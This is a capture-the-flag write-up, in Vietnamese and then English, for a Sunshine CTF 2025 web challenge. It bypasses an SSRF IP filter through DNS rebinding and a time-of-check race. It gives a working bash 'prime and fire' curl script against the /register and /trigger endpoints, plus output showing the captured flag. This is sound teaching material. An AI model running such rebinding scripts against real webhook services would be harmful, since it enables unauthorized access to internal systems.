# Sunshine CTF 2025 — Intergalactic Webhook Service

---

**Thể loại:** Web

**Độ khó:** Trung bình

---

## Tổng quan thử thách

Thử thách "Intergalactic Webhook Service" đưa ra một ứng dụng web cho phép người dùng đăng ký và kích hoạt các webhook. Chức năng này ẩn chứa một lỗ hổng SSRF (Server-Side Request Forgery), cho phép máy chủ của thử thách gửi yêu cầu đến một URL do người dùng cung cấp. Tuy nhiên, ứng dụng đã triển khai một cơ chế bảo vệ bằng cách lọc và chặn các địa chỉ IP nội bộ. Lỗ hổng nằm ở việc cơ chế này có thể bị vượt qua bằng kỹ thuật tấn công DNS Rebinding, khai thác một race condition giữa lúc kiểm tra và lúc sử dụng URL (Time-of-Check to Time-of-Use - TOCTOU).

---

## Mục tiêu

Mục tiêu chính là khai thác lỗ hổng SSRF để vượt qua bộ lọc IP, buộc máy chủ gửi yêu cầu đến một dịch vụ nội bộ đang chạy trên `http://127.0.0.1:5001/flag` và lấy về nội dung của flag.

---

## Kiến thức cần thiết

Để giải quyết thử thách này, người chơi cần có kiến thức về:

- **Server-Side Request Forgery (SSRF):** Hiểu cách một ứng dụng có thể bị thao túng để gửi yêu cầu trái phép từ phía máy chủ.
- **DNS Rebinding:** Nắm vững kỹ thuật tấn công trong đó một tên miền độc hại trả về các địa chỉ IP khác nhau trong các lần truy vấn DNS liên tiếp.
- **Time-of-Check to Time-of-Use (TOCTOU):** Nhận biết và khai thác các lỗ hổng race condition xảy ra khi trạng thái của tài nguyên thay đổi giữa thời điểm kiểm tra và thời điểm sử dụng.
- **Scripting:** Sử dụng các công cụ như `bash` hoặc Python để tự động hóa các cuộc tấn công phức tạp đòi hỏi tốc độ và sự lặp lại.

---

## Phân tích và hướng tiếp cận

Cuộc tấn công được thực hiện qua nhiều bước, từ việc khám phá ứng dụng đến việc triển khai một kỹ thuật tấn công nâng cao để vượt qua cơ chế bảo vệ.

1. **Khám phá Ứng dụng và Lỗ hổng SSRF:**
    - Ứng dụng có hai endpoint chính: `/register` để đăng ký một URL webhook và `/trigger` để kích hoạt nó.
    - Chức năng `/trigger` yêu cầu máy chủ gửi một `POST` request đến URL đã đăng ký, đây chính là một vector SSRF rõ ràng.
    - Mục tiêu là làm cho máy chủ yêu cầu đến `http://127.0.0.1:5001/flag`, nơi một dịch vụ nội bộ đang giữ flag.
2. **Phân tích Cơ chế Bảo vệ và Điểm yếu TOCTOU:**
    - Khi cố gắng đăng ký một URL có IP nội bộ (ví dụ: `127.0.0.1`), ứng dụng sẽ chặn yêu cầu. Mã nguồn cho thấy hàm `is_ip_allowed` thực hiện việc phân giải tên miền thành IP và kiểm tra xem nó có phải là IP công cộng hay không.
    - Điểm yếu chí mạng nằm trong luồng xử lý của endpoint `/trigger`. Nó thực hiện việc kiểm tra IP (Time-of-Check) và gửi yêu cầu (Time-of-Use) tại hai thời điểm riêng biệt. Nếu kết quả phân giải DNS thay đổi *giữa* hai thời điểm này, bộ lọc sẽ bị vô hiệu hóa.
3. **Lên Kế hoạch Tấn công bằng DNS Rebinding:**
    - Để khai thác lỗ hổng TOCTOU, chúng ta sử dụng DNS Rebinding. Chúng ta cần một tên miền được cấu hình đặc biệt để:
        - Lần đầu truy vấn: Trả về một IP công cộng hợp lệ (ví dụ: `8.8.8.8`) để vượt qua bước kiểm tra.
        - Các lần truy vấn sau (khi TTL hết hạn): Trả về IP mục tiêu (`127.0.0.1`) để máy chủ gửi yêu cầu đến dịch vụ nội bộ.
    - Sử dụng một dịch vụ như `rbndr.us`, ta có thể tạo ra một tên miền như vậy. Ví dụ: `08080808.7f000001.rbndr.us` sẽ phân giải lần lượt thành `8.8.8.8` và `127.0.0.1`.
4. **Tối ưu hóa Tấn công với Kỹ thuật "Mồi và Bắn" (Priming and Firing):**
    - Việc chỉ spam endpoint `/trigger` một cách ngẫu nhiên có tỷ lệ thành công rất thấp vì cửa sổ thời gian để khai thác race condition là cực kỳ hẹp.
    - Chúng ta áp dụng một chiến lược hiệu quả hơn:
        - **Mồi (Prime):** Gửi một yêu cầu đến `/register` với tên miền tấn công. Hành động này buộc máy chủ phải thực hiện truy vấn DNS, làm mới bộ đệm (cache) của nó với IP công cộng hợp lệ và khởi động lại bộ đếm TTL.
        - **Bắn (Fire):** Ngay lập tức sau bước "mồi", gửi một loạt yêu cầu `/trigger` với tốc độ cao. Một trong những yêu cầu này có khả năng cao sẽ "trúng" vào thời điểm vàng: cache DNS của máy chủ cho việc kiểm tra vẫn còn IP cũ, nhưng khi thư viện request thực hiện truy vấn mới, nó đã nhận được IP `127.0.0.1`.

---

## Kịch bản giải mã (Exploit)

Một kịch bản `bash` đơn giản được sử dụng để tự động hóa chiến lược "Mồi và Bắn", lặp lại quá trình cho đến khi thành công.

```bash
#!/bin/bash

# --- CẤU HÌNH ---
CHALLENGE_URL="<https://supernova.sunshinectf.games/>"
ATTACK_DOMAIN="<http://08080808.7f000001.rbndr.us:5001/flag>"
# webhook_id nhận được sau khi đăng ký ATTACK_DOMAIN lần đầu
WEBHOOK_ID="1d14f9b7-f4b9-4140-8dfc-c33bbcd68df9"
# -----------------

# Số lượng request trigger sẽ bắn ra trong mỗi loạt
BURST_COUNT=36

echo "Bắt đầu tấn công DNS Rebinding theo phương pháp 'Mồi và Bắn'..."
echo "Nhấn Ctrl+C để dừng."

# Vòng lặp tấn công vô hạn
while true; do
  echo "---------------------------------"
  echo "[+] Giai đoạn MỒI: Làm mới cache DNS của server..."
  # Gửi request tới /register để buộc server phân giải DNS và làm mới cache
  curl -s -o /dev/null -X POST -d "url=$ATTACK_DOMAIN" "$CHALLENGE_URL/register"

  echo "[+] Giai đoạn BẮN: Gửi $BURST_COUNT yêu cầu trigger liên tục..."
  # Bắn một loạt request trigger chạy song song để tăng cơ hội thành công
  for (( i=1; i<=$BURST_COUNT; i++ )); do
    curl -s -X POST -d "id=$WEBHOOK_ID" "$CHALLENGE_URL/trigger" &
  done

  # Đợi tất cả các tiến trình chạy ngầm hoàn tất
  wait
  echo "[+] Hoàn thành một chu kỳ. Đợi 2 giây trước khi lặp lại..."
  sleep 2
done

```

**Kết quả (Flag)**

Sau khi chạy kịch bản trong vài chu kỳ, một trong các yêu cầu đã thành công và trả về phản hồi từ dịch vụ nội bộ chứa flag.

```
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
[+] Hoàn thành một chu kỳ. Đợi 2 giây trước khi lặp lại...
---------------------------------
[+] Giai đoạn MỒI: Làm mới cache DNS của server...
[+] Giai đoạn BẮN: Gửi 36 yêu cầu trigger liên tục...
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"response":"sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}","status":200,"url":"http://08080808.7f000001.rbndr.us:5001/flag"}

```

Flag cuối cùng là: `sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}`

---

## Ghi chú và mẹo

- Thử thách này là một minh họa xuất sắc về cách các biện pháp bảo vệ SSRF dựa trên danh sách đen IP có thể bị thất bại do các lỗ hổng tinh vi như TOCTOU.
- DNS Rebinding vẫn là một kỹ thuật tấn công mạnh mẽ và phù hợp trong các kịch bản thực tế, đặc biệt khi các ứng dụng tương tác với các tài nguyên bên ngoài dựa trên tên miền do người dùng cung cấp.
- Việc khai thác các race condition thường không đáng tin cậy 100%. Các kỹ thuật như "Mồi và Bắn" giúp tăng đáng kể xác suất thành công bằng cách kiểm soát trạng thái của ứng dụng trước khi thực hiện tấn công.

---

# ENGLISH VERSION

**Category:** Web

**Difficulty:** Medium

---

## Challenge Overview

The "Intergalactic Webhook Service" challenge presents a web application that allows users to register and trigger webhooks. This functionality harbors a Server-Side Request Forgery (SSRF) vulnerability, allowing the challenge server to send requests to a user-supplied URL. However, the application implements a security mechanism that filters and blocks internal IP addresses. The vulnerability lies in the fact that this mechanism can be bypassed using a DNS Rebinding attack, which exploits a race condition between the time of check and the time of use (TOCTOU).

---

## Objective

The primary objective is to exploit the SSRF vulnerability to bypass the IP filter, forcing the server to send a request to an internal service running at `http://127.0.0.1:5001/flag` to retrieve the flag's content.

---

## Required Knowledge

To solve this challenge, players need knowledge of:

- **Server-Side Request Forgery (SSRF):** Understanding how an application can be manipulated to send unauthorized requests from the server-side.
- **DNS Rebinding:** Mastery of the attack technique where a malicious domain resolves to different IP addresses in consecutive DNS queries.
- **Time-of-Check to Time-of-Use (TOCTOU):** Recognizing and exploiting race condition vulnerabilities that occur when a resource's state changes between the time it is checked and the time it is used.
- **Scripting:** Using tools like `bash` or Python to automate complex attacks that require speed and repetition.

---

## Analysis and Approach

The attack is carried out in several steps, from discovering the application's functionality to deploying an advanced attack technique to bypass its security mechanism.

1. **Application Discovery and SSRF Vulnerability:**
    - The application has two main endpoints: `/register` to register a webhook URL and `/trigger` to activate it.
    - The `/trigger` functionality causes the server to send a `POST` request to the registered URL, which is a clear SSRF vector.
    - The goal is to make the server request `http://127.0.0.1:5001/flag`, where an internal service holds the flag.
2. **Analyzing the Protection Mechanism and TOCTOU Weakness:**
    - When attempting to register a URL with an internal IP (e.g., `127.0.0.1`), the application blocks the request. The source code reveals an `is_ip_allowed` function that resolves the domain to an IP and checks if it is a public address.
    - The critical weakness lies in the `/trigger` endpoint's processing flow. It performs the IP check (Time-of-Check) and sends the request (Time-of-Use) at two separate moments. If the DNS resolution result changes *between* these two moments, the filter can be bypassed.
3. **Planning the Attack with DNS Rebinding:**
    - To exploit this TOCTOU vulnerability, we use DNS Rebinding. We need a specially configured domain that:
        - On the first query: Resolves to a valid public IP (e.g., `8.8.8.8`) to pass the check.
        - On subsequent queries (after the TTL expires): Resolves to the target IP (`127.0.0.1`) so the server sends the request to the internal service.
    - Using a service like `rbndr.us`, we can create such a domain. For example, `08080808.7f000001.rbndr.us` will resolve sequentially to `8.8.8.8` and `127.0.0.1`.
4. **Optimizing the Attack with the "Priming and Firing" Technique:**
    - Simply spamming the `/trigger` endpoint randomly has a very low success rate because the window to exploit the race condition is extremely narrow.
    - We adopt a more effective strategy:
        - **Prime:** Send a request to `/register` with the attack domain. This action forces the server to perform a DNS query, refreshing its cache with the valid public IP and resetting the TTL countdown.
        - **Fire:** Immediately after the "priming" step, send a high-volume burst of `/trigger` requests. One of these requests is highly likely to hit the golden moment: the server's DNS cache for the check still holds the old IP, but when the request library performs a new query, it receives `127.0.0.1`.

---

## Exploit Script

A simple `bash` script was used to automate the "Priming and Firing" strategy, repeating the process until successful.

```bash
#!/bin/bash

# --- CONFIGURATION ---
CHALLENGE_URL="<https://supernova.sunshinectf.games/>"
ATTACK_DOMAIN="<http://08080808.7f000001.rbndr.us:5001/flag>"
# webhook_id obtained after registering the ATTACK_DOMAIN for the first time
WEBHOOK_ID="1d14f9b7-f4b9-4140-8dfc-c33bbcd68df9"
# -----------------

# Number of trigger requests to fire in each burst
BURST_COUNT=36

echo "Starting DNS Rebinding attack using the 'Priming and Firing' method..."
echo "Press Ctrl+C to stop."

# Infinite attack loop
while true; do
  echo "---------------------------------"
  echo "[+] PRIMING phase: Refreshing the server's DNS cache..."
  # Send a request to /register to force the server to resolve DNS and refresh its cache
  curl -s -o /dev/null -X POST -d "url=$ATTACK_DOMAIN" "$CHALLENGE_URL/register"

  echo "[+] FIRING phase: Sending $BURST_COUNT trigger requests concurrently..."
  # Fire a burst of trigger requests in parallel to increase the chance of success
  for (( i=1; i<=$BURST_COUNT; i++ )); do
    curl -s -X POST -d "id=$WEBHOOK_ID" "$CHALLENGE_URL/trigger" &
  done

  # Wait for all background curl processes to complete
  wait
  echo "[+] Cycle complete. Waiting 2 seconds before repeating..."
  sleep 2
done

```

**Result (Flag)**

After running the script for a few cycles, one of the requests successfully hit the race condition and returned a response from the internal service containing the flag.

```
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
{"error":"something went wrong","url":"http://08080808.7f000001.rbndr.us:5001/flag"}
[+] Hoàn thành một chu kỳ. Đợi 2 giây trước khi lặp lại...
---------------------------------
[+] Giai đoạn MỒI: Làm mới cache DNS của server...
[+] Giai đoạn BẮN: Gửi 36 yêu cầu trigger liên tục...
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"error":"IP \"127.0.0.1\" not allowed"}
{"response":"sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}","status":200,"url":"http://08080808.7f000001.rbndr.us:5001/flag"}

```

The final flag is: `sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}`

---

## Postmortem / Tips

- This challenge is an excellent illustration of how IP blacklisting-based SSRF defenses can fail due to subtle vulnerabilities like TOCTOU.
- DNS Rebinding remains a powerful and relevant attack technique in real-world scenarios, especially when applications interact with external resources based on user-supplied domains.
- Exploiting race conditions is often not 100% reliable. Techniques like "Priming and Firing" significantly increase the probability of success by controlling the application's state before launching the attack.
